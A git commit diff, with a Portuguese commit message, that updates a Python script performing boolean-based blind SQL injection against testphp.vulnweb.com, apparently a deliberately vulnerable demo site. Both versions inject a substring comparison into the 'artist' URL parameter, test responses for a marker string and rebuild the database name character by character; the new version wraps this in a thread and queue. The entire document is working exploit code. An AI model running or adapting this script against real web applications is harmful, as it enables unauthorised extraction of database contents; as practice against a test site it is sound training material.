9d971d59e3da31a200adc192a3def45a693fdfe1
jeferson cardoso <jefersoncardoso.dev@gmail.com>
2021-09-23 19:17:16 -0400

    Updade Script
    Atualização do código demostrativos

--- BlindSQLiBooleanBased.py
+++ BlindSQLiBooleanBased.py
@@ -1,17 +1,38 @@
 import requests
-info = """
-method :  ................................ GET
-url : .................................... {}"""
-url = 'http://testphp.vulnweb.com/artists.php?artist=2'
-payload = 'database()'
-inject = " and substring( ( {} ), {} ,1 )= {} -- -"
-reference = 'Blad3'
-print(info.format(url))
-for i in range(1, 10):
-    for j in range(ord('a'), ord('u') + 1):
-        r = requests.get(url + inject.format(payload, str(i), hex(ord(chr(j)))))
+from queue import Queue
+from threading import Thread
+import threading
+from time import sleep
+
+db =[]
+
+def inject_simple(url:str,query:str,queue):
+    reference = 'Blad3'
+    for i in range(1, 10):
+      for j in range(ord('a'), ord('u') + 1):
+        montagem =f"{url} and substring( ( {query} ), {str(i)} ,1 )= {hex(ord(chr(j)))} -- -"
+        print(montagem)        
+        r = requests.get(montagem)
+        queue.put(r)
+        while queue.qsize() > 0:
+            queue.get(r)
+            queue.task_done
         html = r.text
         if reference in html:
-            print("true : ", chr(j))
+            db.append(chr(j))
+          
 
 
+url = 'http://testphp.vulnweb.com/artists.php?artist=2'
+payload = 'database()'
+quantidade_de_thread = [ ]
+
+threads = Thread(target=inject_simple, args=(url,payload, Queue()), daemon=True)
+threads.start()
+quantidade_de_thread.append(threads)
+
+for inciar in quantidade_de_thread:
+    inciar.join()
+
+name_dba = ''.join(db)
+print(f"Banco de dados :===> {name_dba}")
